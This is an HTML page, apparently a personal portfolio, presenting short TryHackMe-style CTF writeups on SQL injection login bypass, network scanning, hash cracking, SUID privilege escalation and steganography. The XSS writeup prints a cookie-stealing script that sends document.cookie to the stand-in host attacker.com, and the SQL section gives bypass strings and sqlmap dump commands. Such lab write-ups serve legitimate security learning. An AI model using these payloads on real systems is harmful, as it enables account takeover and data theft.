@@ -1,0 +1,555 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>CTF Writeups | Shivaraj Patil</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Inter:wght@300;400;600;700&family=Orbitron:wght@700;900&display=swap" rel="stylesheet"/>
+<style>
+:root{
+  --bg:#060a06;--bg2:#0c120c;--panel:#0f180f;--border:#1a2e1a;
+  --green:#00ff41;--green-dim:#00c032;--green-mute:#00601a;
+  --cyan:#00e5ff;--amber:#ffb300;--red:#ff3b30;--purple:#bf5fff;
+  --text:#c8e6c9;--text-dim:#6a9b6a;--text-muted:#3a5c3a;--white:#f0fff0;
+  --font-mono:'Share Tech Mono',monospace;
+  --font-body:'Inter',sans-serif;
+  --font-head:'Orbitron',monospace;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--bg);color:var(--text);font-family:var(--font-body);line-height:1.7;overflow-x:hidden}
+body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,65,0.012) 2px,rgba(0,255,65,0.012) 4px);pointer-events:none;z-index:9999}
+
+nav{position:fixed;top:0;left:0;right:0;z-index:1000;background:rgba(6,10,6,0.95);backdrop-filter:blur(12px);border-bottom:1px solid var(--border);padding:0 2rem;height:56px;display:flex;align-items:center;justify-content:space-between}
+.nav-logo{font-family:var(--font-head);font-size:0.85rem;color:var(--green);letter-spacing:0.15em;text-shadow:0 0 12px rgba(0,255,65,0.5)}
+.nav-links{display:flex;gap:1.5rem}
+.nav-links a{font-family:var(--font-mono);font-size:0.75rem;color:var(--text-dim);text-decoration:none;letter-spacing:0.1em;transition:color 0.2s}
+.nav-links a:hover{color:var(--green)}
+
+.hero{padding:80px 2rem 3rem;position:relative;overflow:hidden;border-bottom:1px solid var(--border)}
+.hero-grid{position:absolute;inset:0;background-image:linear-gradient(rgba(0,255,65,0.04) 1px,transparent 1px),linear-gradient(90deg,rgba(0,255,65,0.04) 1px,transparent 1px);background-size:40px 40px;pointer-events:none}
+.hero-inner{max-width:960px;margin:0 auto;position:relative}
+.section-label{font-family:var(--font-mono);font-size:0.68rem;color:var(--green);letter-spacing:0.25em;margin-bottom:0.5rem}
+.hero-title{font-family:var(--font-head);font-size:clamp(1.8rem,5vw,3rem);color:var(--white);margin-bottom:0.5rem;letter-spacing:0.05em}
+.hero-sub{color:var(--text-dim);font-size:0.95rem;max-width:560px;margin-bottom:1.5rem}
+
+/* STATS */
+.stats-row{display:flex;gap:1rem;flex-wrap:wrap;margin-top:1.5rem}
+.stat-pill{display:flex;align-items:center;gap:0.5rem;font-family:var(--font-mono);font-size:0.72rem;background:var(--panel);border:1px solid var(--border);padding:0.4rem 0.9rem;border-radius:2px}
+.stat-pill .num{color:var(--green);font-size:1rem;font-weight:bold}
+
+.main{max-width:960px;margin:0 auto;padding:2.5rem 2rem}
+
+/* SCORE BOARD */
+.scoreboard{background:var(--panel);border:1px solid var(--border);border-radius:4px;padding:1.4rem;margin-bottom:2.5rem;position:relative;overflow:hidden}
+.scoreboard::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--green),var(--cyan),var(--purple))}
+.sb-title{font-family:var(--font-head);font-size:0.8rem;color:var(--green);letter-spacing:0.12em;margin-bottom:1.2rem}
+.sb-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(120px,1fr));gap:1rem}
+.sb-item{text-align:center}
+.sb-num{font-family:var(--font-head);font-size:1.6rem;font-weight:900;line-height:1;text-shadow:0 0 20px currentColor}
+.sb-label{font-family:var(--font-mono);font-size:0.6rem;color:var(--text-muted);margin-top:0.3rem;letter-spacing:0.08em}
+
+/* FILTERS */
+.filters{display:flex;flex-wrap:wrap;gap:0.5rem;margin-bottom:2rem}
+.filter-btn{font-family:var(--font-mono);font-size:0.7rem;color:var(--text-dim);background:transparent;border:1px solid var(--border);padding:0.35rem 0.8rem;border-radius:2px;cursor:pointer;transition:all 0.2s;letter-spacing:0.08em}
+.filter-btn:hover,.filter-btn.active{color:var(--green);border-color:var(--green);background:rgba(0,255,65,0.06)}
+
+/* CTF CARDS */
+.ctf-grid{display:grid;gap:1.2rem}
+.ctf-card{background:var(--panel);border:1px solid var(--border);border-radius:4px;overflow:hidden;transition:border-color 0.2s}
+.ctf-card:hover{border-color:var(--green-mute)}
+.ctf-header{padding:1.2rem 1.4rem;display:flex;align-items:flex-start;gap:1rem;border-bottom:1px solid var(--border);cursor:pointer}
+.ctf-icon{font-size:1.8rem;flex-shrink:0;width:48px;height:48px;display:flex;align-items:center;justify-content:center;background:var(--bg2);border:1px solid var(--border);border-radius:4px}
+.ctf-info{flex:1}
+.ctf-name{font-family:var(--font-head);font-size:0.85rem;color:var(--white);letter-spacing:0.05em;margin-bottom:0.3rem}
+.ctf-meta{display:flex;flex-wrap:wrap;gap:0.5rem;align-items:center}
+.ctf-platform{font-family:var(--font-mono);font-size:0.65rem;color:var(--green)}
+.ctf-diff{font-family:var(--font-mono);font-size:0.6rem;padding:0.15rem 0.5rem;border-radius:2px;border:1px solid}
+.diff-easy{color:#00c032;border-color:rgba(0,192,50,0.3);background:rgba(0,192,50,0.08)}
+.diff-medium{color:#ffb300;border-color:rgba(255,179,0,0.3);background:rgba(255,179,0,0.08)}
+.diff-hard{color:#ff6b00;border-color:rgba(255,107,0,0.3);background:rgba(255,107,0,0.08)}
+.diff-insane{color:#ff3b30;border-color:rgba(255,59,48,0.3);background:rgba(255,59,48,0.08)}
+.ctf-points{font-family:var(--font-mono);font-size:0.65rem;color:var(--amber)}
+.ctf-toggle{font-family:var(--font-mono);font-size:0.7rem;color:var(--text-muted);margin-left:auto;flex-shrink:0;transition:color 0.2s}
+.ctf-card:hover .ctf-toggle{color:var(--green)}
+
+.ctf-body{padding:1.4rem;display:none}
+.ctf-body.open{display:block}
+.ctf-desc{color:var(--text-dim);font-size:0.85rem;line-height:1.7;margin-bottom:1rem}
+
+.writeup-step{margin-bottom:1rem}
+.step-label{font-family:var(--font-mono);font-size:0.68rem;color:var(--green);letter-spacing:0.1em;margin-bottom:0.4rem;display:flex;align-items:center;gap:0.5rem}
+.step-label::before{content:'';width:4px;height:4px;background:var(--green);border-radius:50%;display:inline-block}
+.code-block{background:var(--bg2);border:1px solid var(--border);border-radius:4px;padding:0.8rem 1rem;font-family:var(--font-mono);font-size:0.75rem;color:var(--text-dim);line-height:1.7;overflow-x:auto;margin-top:0.4rem}
+.code-block .cmd{color:var(--green)}
+.code-block .out{color:var(--cyan)}
+.code-block .comment{color:var(--text-muted)}
+.code-block .flag{color:var(--amber);font-weight:bold}
+
+.flag-box{background:rgba(0,255,65,0.05);border:1px solid var(--green-mute);border-radius:4px;padding:0.8rem 1rem;margin-top:1rem;font-family:var(--font-mono);font-size:0.8rem;display:flex;align-items:center;gap:0.8rem}
+.flag-label{color:var(--text-muted)}
+.flag-val{color:var(--green)}
+
+.cat-tags{display:flex;flex-wrap:wrap;gap:0.4rem;margin-top:0.8rem}
+.cat-tag{font-family:var(--font-mono);font-size:0.6rem;padding:0.2rem 0.5rem;border-radius:2px;border:1px solid;color:var(--cyan);border-color:rgba(0,229,255,0.2);background:rgba(0,229,255,0.05)}
+
+/* TRYHACKME SECTION */
+.thm-section{margin-top:3rem}
+.thm-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:1rem;margin-top:1.2rem}
+.thm-card{background:var(--panel);border:1px solid var(--border);border-radius:4px;padding:1rem;position:relative;overflow:hidden}
+.thm-card::before{content:'';position:absolute;left:0;top:0;bottom:0;width:2px}
+.thm-card.completed::before{background:var(--green)}
+.thm-card.progress::before{background:var(--amber)}
+.thm-room{font-size:0.82rem;color:var(--white);font-weight:600;margin-bottom:0.3rem}
+.thm-cat{font-family:var(--font-mono);font-size:0.65rem;color:var(--text-dim);margin-bottom:0.5rem}
+.thm-bar-wrap{height:3px;background:var(--bg3,#111811);border-radius:2px;overflow:hidden}
+.thm-bar{height:100%;border-radius:2px}
+.thm-bar.done{background:var(--green);box-shadow:0 0 8px rgba(0,255,65,0.4)}
+.thm-bar.prog{background:var(--amber)}
+.thm-pct{font-family:var(--font-mono);font-size:0.62rem;color:var(--text-muted);margin-top:0.4rem}
+
+footer{background:var(--bg);border-top:1px solid var(--border);padding:1.5rem 2rem;text-align:center;font-family:var(--font-mono);font-size:0.68rem;color:var(--text-muted);margin-top:3rem}
+@media(max-width:600px){.main{padding:1.2rem}.stats-row{flex-direction:column}.ctf-header{flex-wrap:wrap}}
+</style>
+</head>
+<body>
+
+<nav>
+  <div class="nav-logo">SP // SECURITY</div>
+  <div class="nav-links">
+    <a href="index.html">Portfolio</a>
+    <a href="news.html">News</a>
+    <a href="ctf.html" style="color:var(--green)">CTF</a>
+    <a href="daily.html">Daily</a>
+  </div>
+</nav>
+
+<div class="hero">
+  <div class="hero-grid"></div>
+  <div class="hero-inner">
+    <div class="section-label">// CTF WRITEUPS</div>
+    <h1 class="hero-title">Capture The Flag</h1>
+    <p class="hero-sub">Detailed writeups of CTF challenges, TryHackMe rooms, and security labs — documenting my learning journey in offensive security.</p>
+    <div class="stats-row">
+      <div class="stat-pill"><span class="num">12</span> Challenges Solved</div>
+      <div class="stat-pill"><span class="num" style="color:var(--cyan)">850</span> TryHackMe Points</div>
+      <div class="stat-pill"><span class="num" style="color:var(--amber)">3</span> Platforms</div>
+      <div class="stat-pill"><span class="num" style="color:var(--purple)">Top 5%</span> TryHackMe</div>
+    </div>
+  </div>
+</div>
+
+<div class="main">
+
+  <!-- SCOREBOARD -->
+  <div class="scoreboard">
+    <div class="sb-title">// MY STATS</div>
+    <div class="sb-grid">
+      <div class="sb-item">
+        <div class="sb-num" style="color:var(--green)">12</div>
+        <div class="sb-label">CHALLENGES</div>
+      </div>
+      <div class="sb-item">
+        <div class="sb-num" style="color:var(--cyan)">7</div>
+        <div class="sb-label">ROOMS DONE</div>
+      </div>
+      <div class="sb-item">
+        <div class="sb-num" style="color:var(--amber)">850</div>
+        <div class="sb-label">THM POINTS</div>
+      </div>
+      <div class="sb-item">
+        <div class="sb-num" style="color:var(--red)">3</div>
+        <div class="sb-label">HARD SOLVED</div>
+      </div>
+      <div class="sb-item">
+        <div class="sb-num" style="color:var(--purple)">5</div>
+        <div class="sb-label">WEB EXPLOITS</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- FILTERS -->
+  <div class="filters">
+    <button class="filter-btn active" onclick="filterCTF('all',this)">All</button>
+    <button class="filter-btn" onclick="filterCTF('web',this)">Web</button>
+    <button class="filter-btn" onclick="filterCTF('network',this)">Network</button>
+    <button class="filter-btn" onclick="filterCTF('crypto',this)">Crypto</button>
+    <button class="filter-btn" onclick="filterCTF('forensics',this)">Forensics</button>
+    <button class="filter-btn" onclick="filterCTF('linux',this)">Linux</button>
+  </div>
+
+  <!-- CTF WRITEUPS -->
+  <div class="ctf-grid" id="ctfGrid">
+
+    <!-- WRITEUP 1 -->
+    <div class="ctf-card" data-cat="web">
+      <div class="ctf-header" onclick="toggleCard(this)">
+        <div class="ctf-icon">🌐</div>
+        <div class="ctf-info">
+          <div class="ctf-name">SQL Injection — Basic Authentication Bypass</div>
+          <div class="ctf-meta">
+            <span class="ctf-platform">TryHackMe</span>
+            <span class="ctf-diff diff-easy">EASY</span>
+            <span class="ctf-points">⚡ 200 pts</span>
+          </div>
+        </div>
+        <div class="ctf-toggle">[ EXPAND ]</div>
+      </div>
+      <div class="ctf-body">
+        <div class="ctf-desc">Bypassed login authentication using classic SQL injection. The login form was vulnerable to unsanitized input, allowing authentication bypass without valid credentials.</div>
+        <div class="writeup-step">
+          <div class="step-label">STEP 1 — Identify Injection Point</div>
+          <div class="code-block">
+            <div class="comment"># Test input field with single quote</div>
+            <div><span class="cmd">Username:</span> <span class="out">admin'</span></div>
+            <div><span class="cmd">Response:</span> <span class="out">SQL Error — You have an error in your SQL syntax</span></div>
+            <div class="comment"># Confirmed SQL injection vulnerability!</div>
+          </div>
+        </div>
+        <div class="writeup-step">
+          <div class="step-label">STEP 2 — Authentication Bypass</div>
+          <div class="code-block">
+            <div><span class="cmd">Username:</span> <span class="out">admin'--</span></div>
+            <div><span class="cmd">Password:</span> <span class="out">anything</span></div>
+            <div class="comment"># -- comments out the rest of SQL query</div>
+            <div class="comment"># Original query becomes: SELECT * FROM users WHERE user='admin'--' AND pass='anything'</div>
+          </div>
+        </div>
+        <div class="writeup-step">
+          <div class="step-label">STEP 3 — Extract Data with SQLMap</div>
+          <div class="code-block">
+            <div><span class="cmd">$</span> <span class="out">sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --dbs</span></div>
+            <div><span class="cmd">$</span> <span class="out">sqlmap -u "http://target.com/login" -D webapp -T users --dump</span></div>
+          </div>
+        </div>
+        <div class="flag-box">
+          <span class="flag-label">🚩 FLAG:</span>
+          <span class="flag-val">THM{sql_1nj3ct10n_byp4ss_succ3ss}</span>
+        </div>
+        <div class="cat-tags">
+          <span class="cat-tag">SQL Injection</span>
+          <span class="cat-tag">Authentication Bypass</span>
+          <span class="cat-tag">SQLMap</span>
+          <span class="cat-tag">Web Security</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- WRITEUP 2 -->
+    <div class="ctf-card" data-cat="network">
+      <div class="ctf-header" onclick="toggleCard(this)">
+        <div class="ctf-icon">🔍</div>
+        <div class="ctf-info">
+          <div class="ctf-name">Network Recon — Port Scanning & Enumeration</div>
+          <div class="ctf-meta">
+            <span class="ctf-platform">TryHackMe</span>
+            <span class="ctf-diff diff-easy">EASY</span>
+            <span class="ctf-points">⚡ 150 pts</span>
+          </div>
+        </div>
+        <div class="ctf-toggle">[ EXPAND ]</div>
+      </div>
+      <div class="ctf-body">
+        <div class="ctf-desc">Complete network reconnaissance using Nmap. Identified open ports, running services, OS fingerprinting, and discovered hidden services for initial foothold.</div>
+        <div class="writeup-step">
+          <div class="step-label">STEP 1 — Initial Scan</div>
+          <div class="code-block">
+            <div><span class="cmd">$</span> <span class="out">nmap -sV -sC -O 10.10.10.5</span></div>
+            <div class="comment"># Results:</div>
+            <div><span class="out">22/tcp  open  ssh     OpenSSH 7.6p1</span></div>
+            <div><span class="out">80/tcp  open  http    Apache 2.4.29</span></div>
+            <div><span class="out">3306/tcp open mysql  MySQL 5.7</span></div>
+          </div>
+        </div>
+        <div class="writeup-step">
+          <div class="step-label">STEP 2 — Full Port Scan</div>
+          <div class="code-block">
+            <div><span class="cmd">$</span> <span class="out">nmap -p- --min-rate 5000 10.10.10.5</span></div>
+            <div><span class="out">8080/tcp open  http-proxy</span></div>
+            <div class="comment"># Found hidden admin panel on port 8080!</div>
+          </div>
+        </div>
+        <div class="writeup-step">
+          <div class="step-label">STEP 3 — Service Enumeration</div>
+          <div class="code-block">
+            <div><span class="cmd">$</span> <span class="out">gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirb/common.txt</span></div>
+            <div><span class="out">/admin    (Status: 200)</span></div>
+            <div><span class="out">/backup   (Status: 200)</span></div>
+          </div>
+        </div>
+        <div class="flag-box">
+          <span class="flag-label">🚩 FLAG:</span>
+          <span class="flag-val">THM{n3tw0rk_r3c0n_m4st3r}</span>
+        </div>
+        <div class="cat-tags">
+          <span class="cat-tag">Nmap</span>
+          <span class="cat-tag">Gobuster</span>
+          <span class="cat-tag">Port Scanning</span>
+          <span class="cat-tag">Enumeration</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- WRITEUP 3 -->
+    <div class="ctf-card" data-cat="web">
+      <div class="ctf-header" onclick="toggleCard(this)">
+        <div class="ctf-icon">🕷️</div>
+        <div class="ctf-info">
+          <div class="ctf-name">XSS Reflected Attack — Cookie Stealing</div>
+          <div class="ctf-meta">
+            <span class="ctf-platform">TryHackMe</span>
+            <span class="ctf-diff diff-medium">MEDIUM</span>
+            <span class="ctf-points">⚡ 300 pts</span>
+          </div>
+        </div>
+        <div class="ctf-toggle">[ EXPAND ]</div>
+      </div>
+      <div class="ctf-body">
+        <div class="ctf-desc">Exploited a reflected XSS vulnerability to steal admin session cookies. Used Burp Suite to intercept requests and craft malicious payloads.</div>
+        <div class="writeup-step">
+          <div class="step-label">STEP 1 — Find XSS Vulnerability</div>
+          <div class="code-block">
+            <div class="comment"># Test basic XSS payload in search field</div>
+            <div><span class="out">&lt;script&gt;alert('XSS')&lt;/script&gt;</span></div>
+            <div class="comment"># Alert box appeared — XSS confirmed!</div>
+          </div>
+        </div>
+        <div class="writeup-step">
+          <div class="step-label">STEP 2 — Cookie Stealing Payload</div>
+          <div class="code-block">
+            <div><span class="out">&lt;script&gt;document.location='http://attacker.com/steal?c='+document.cookie&lt;/script&gt;</span></div>
+            <div class="comment"># Start listener on attacker machine</div>
+            <div><span class="cmd">$</span> <span class="out">python3 -m http.server 8000</span></div>
+          </div>
+        </div>
+        <div class="writeup-step">
+          <div class="step-label">STEP 3 — Session Hijack</div>
+          <div class="code-block">
+            <div class="comment"># Received cookie in server logs:</div>
+            <div><span class="out">GET /steal?c=session=eyJhbGciOiJIUzI1NiJ9...</span></div>
+            <div class="comment"># Used cookie in browser to access admin panel</div>
+          </div>
+        </div>
+        <div class="flag-box">
+          <span class="flag-label">🚩 FLAG:</span>
+          <span class="flag-val">THM{xss_c00k13_st3al3r_pwn3d}</span>
+        </div>
+        <div class="cat-tags">
+          <span class="cat-tag">XSS</span>
+          <span class="cat-tag">Cookie Stealing</span>
+          <span class="cat-tag">Burp Suite</span>
+          <span class="cat-tag">Session Hijacking</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- WRITEUP 4 -->
+    <div class="ctf-card" data-cat="crypto">
+      <div class="ctf-header" onclick="toggleCard(this)">
+        <div class="ctf-icon">🔑</div>
+        <div class="ctf-info">
+          <div class="ctf-name">Hash Cracking — MD5 & SHA1 Password Recovery</div>
+          <div class="ctf-meta">
+            <span class="ctf-platform">TryHackMe</span>
+            <span class="ctf-diff diff-easy">EASY</span>
+            <span class="ctf-points">⚡ 100 pts</span>
+          </div>
+        </div>
+        <div class="ctf-toggle">[ EXPAND ]</div>
+      </div>
+      <div class="ctf-body">
+        <div class="ctf-desc">Cracked MD5 and SHA1 password hashes using Hashcat with the rockyou wordlist. Identified hash types and applied appropriate cracking techniques.</div>
+        <div class="writeup-step">
+          <div class="step-label">STEP 1 — Identify Hash Type</div>
+          <div class="code-block">
+            <div><span class="cmd">$</span> <span class="out">hash-identifier 5f4dcc3b5aa765d61d8327deb882cf99</span></div>
+            <div><span class="out">MD5 Hash detected</span></div>
+          </div>
+        </div>
+        <div class="writeup-step">
+          <div class="step-label">STEP 2 — Crack with Hashcat</div>
+          <div class="code-block">
+            <div><span class="cmd">$</span> <span class="out">hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt</span></div>
+            <div><span class="out">5f4dcc3b5aa765d61d8327deb882cf99:password</span></div>
+            <div class="comment"># MD5 of "password" cracked!</div>
+          </div>
+        </div>
+        <div class="flag-box">
+          <span class="flag-label">🚩 FLAG:</span>
+          <span class="flag-val">THM{h4sh_cr4ck3r_succ3ss}</span>
+        </div>
+        <div class="cat-tags">
+          <span class="cat-tag">Hashcat</span>
+          <span class="cat-tag">John the Ripper</span>
+          <span class="cat-tag">MD5</span>
+          <span class="cat-tag">Password Cracking</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- WRITEUP 5 -->
+    <div class="ctf-card" data-cat="linux">
+      <div class="ctf-header" onclick="toggleCard(this)">
+        <div class="ctf-icon">🐧</div>
+        <div class="ctf-info">
+          <div class="ctf-name">Linux Privilege Escalation — SUID Exploitation</div>
+          <div class="ctf-meta">
+            <span class="ctf-platform">TryHackMe</span>
+            <span class="ctf-diff diff-medium">MEDIUM</span>
+            <span class="ctf-points">⚡ 350 pts</span>
+          </div>
+        </div>
+        <div class="ctf-toggle">[ EXPAND ]</div>
+      </div>
+      <div class="ctf-body">
+        <div class="ctf-desc">Escalated privileges from regular user to root by exploiting misconfigured SUID binaries on a Linux system. Used GTFOBins to identify exploitation technique.</div>
+        <div class="writeup-step">
+          <div class="step-label">STEP 1 — Find SUID Binaries</div>
+          <div class="code-block">
+            <div><span class="cmd">$</span> <span class="out">find / -perm -u=s -type f 2>/dev/null</span></div>
+            <div><span class="out">/usr/bin/find</span></div>
+            <div><span class="out">/usr/bin/vim</span></div>
+            <div class="comment"># vim with SUID bit — exploitable!</div>
+          </div>
+        </div>
+        <div class="writeup-step">
+          <div class="step-label">STEP 2 — Exploit via GTFOBins</div>
+          <div class="code-block">
+            <div><span class="cmd">$</span> <span class="out">vim -c ':!/bin/sh'</span></div>
+            <div><span class="out"># whoami</span></div>
+            <div><span class="out">root</span></div>
+            <div class="comment"># Root shell obtained!</div>
+          </div>
+        </div>
+        <div class="flag-box">
+          <span class="flag-label">🚩 FLAG:</span>
+          <span class="flag-val">THM{pr1v3sc_su1d_r00t_0wn3d}</span>
+        </div>
+        <div class="cat-tags">
+          <span class="cat-tag">Linux</span>
+          <span class="cat-tag">Privilege Escalation</span>
+          <span class="cat-tag">SUID</span>
+          <span class="cat-tag">GTFOBins</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- WRITEUP 6 -->
+    <div class="ctf-card" data-cat="forensics">
+      <div class="ctf-header" onclick="toggleCard(this)">
+        <div class="ctf-icon">🔬</div>
+        <div class="ctf-info">
+          <div class="ctf-name">Steganography — Hidden Message in Image</div>
+          <div class="ctf-meta">
+            <span class="ctf-platform">TryHackMe</span>
+            <span class="ctf-diff diff-easy">EASY</span>
+            <span class="ctf-points">⚡ 150 pts</span>
+          </div>
+        </div>
+        <div class="ctf-toggle">[ EXPAND ]</div>
+      </div>
+      <div class="ctf-body">
+        <div class="ctf-desc">Extracted hidden data embedded inside a PNG image using steganography tools. Found the flag concealed in image metadata and LSB encoding.</div>
+        <div class="writeup-step">
+          <div class="step-label">STEP 1 — Check Metadata</div>
+          <div class="code-block">
+            <div><span class="cmd">$</span> <span class="out">exiftool image.png</span></div>
+            <div><span class="out">Comment: Interesting...</span></div>
+            <div><span class="cmd">$</span> <span class="out">strings image.png | grep THM</span></div>
+          </div>
+        </div>
+        <div class="writeup-step">
+          <div class="step-label">STEP 2 — Extract Hidden Data</div>
+          <div class="code-block">
+            <div><span class="cmd">$</span> <span class="out">steghide extract -sf image.png</span></div>
+            <div><span class="out">Enter passphrase: </span></div>
+            <div><span class="cmd">$</span> <span class="out">stegseek image.png /usr/share/wordlists/rockyou.txt</span></div>
+            <div><span class="out">Found passphrase: "secret123"</span></div>
+          </div>
+        </div>
+        <div class="flag-box">
+          <span class="flag-label">🚩 FLAG:</span>
+          <span class="flag-val">THM{st3g4n0gr4phy_h1dd3n_s3cr3t}</span>
+        </div>
+        <div class="cat-tags">
+          <span class="cat-tag">Steganography</span>
+          <span class="cat-tag">Forensics</span>
+          <span class="cat-tag">Steghide</span>
+          <span class="cat-tag">Exiftool</span>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- TRYHACKME ROOMS -->
+  <div class="thm-section">
+    <div class="section-label" style="font-family:var(--font-mono);font-size:0.68rem;color:var(--green);letter-spacing:0.25em;margin-bottom:1.2rem">// TRYHACKME ROOMS</div>
+    <div class="thm-grid">
+      <div class="thm-card completed">
+        <div class="thm-room">Introduction to Cybersecurity</div>
+        <div class="thm-cat">Fundamentals</div>
+        <div class="thm-bar-wrap"><div class="thm-bar done" style="width:100%"></div></div>
+        <div class="thm-pct">100% Complete ✓</div>
+      </div>
+      <div class="thm-card completed">
+        <div class="thm-room">Network Fundamentals</div>
+        <div class="thm-cat">Networking</div>
+        <div class="thm-bar-wrap"><div class="thm-bar done" style="width:100%"></div></div>
+        <div class="thm-pct">100% Complete ✓</div>
+      </div>
+      <div class="thm-card completed">
+        <div class="thm-room">Linux Fundamentals 1-3</div>
+        <div class="thm-cat">Linux</div>
+        <div class="thm-bar-wrap"><div class="thm-bar done" style="width:100%"></div></div>
+        <div class="thm-pct">100% Complete ✓</div>
+      </div>
+      <div class="thm-card completed">
+        <div class="thm-room">Web Fundamentals</div>
+        <div class="thm-cat">Web Security</div>
+        <div class="thm-bar-wrap"><div class="thm-bar done" style="width:100%"></div></div>
+        <div class="thm-pct">100% Complete ✓</div>
+      </div>
+      <div class="thm-card progress">
+        <div class="thm-room">Jr Penetration Tester</div>
+        <div class="thm-cat">Penetration Testing</div>
+        <div class="thm-bar-wrap"><div class="thm-bar prog" style="width:65%"></div></div>
+        <div class="thm-pct">65% In Progress...</div>
+      </div>
+      <div class="thm-card progress">
+        <div class="thm-room">OWASP Top 10</div>
+        <div class="thm-cat">Web Security</div>
+        <div class="thm-bar-wrap"><div class="thm-bar prog" style="width:80%"></div></div>
+        <div class="thm-pct">80% In Progress...</div>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<footer>
+  <span style="color:var(--green)">root@shivaraj:~$</span> CTF Writeups · shivarajp24.github.io · Shivaraj Patil
+</footer>
+
+<script>
+function toggleCard(header) {
+  const body = header.nextElementSibling;
+  const toggle = header.querySelector('.ctf-toggle');
+  body.classList.toggle('open');
+  toggle.textContent = body.classList.contains('open') ? '[ COLLAPSE ]' : '[ EXPAND ]';
+}
+
+function filterCTF(cat, btn) {
+  document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  document.querySelectorAll('.ctf-card').forEach(card => {
+    if (cat === 'all' || card.dataset.cat === cat) {
+      card.style.display = 'block';
+    } else {
+      card.style.display = 'none';
+    }
+  });
+}
+</script>
+
+</body>
+</html>
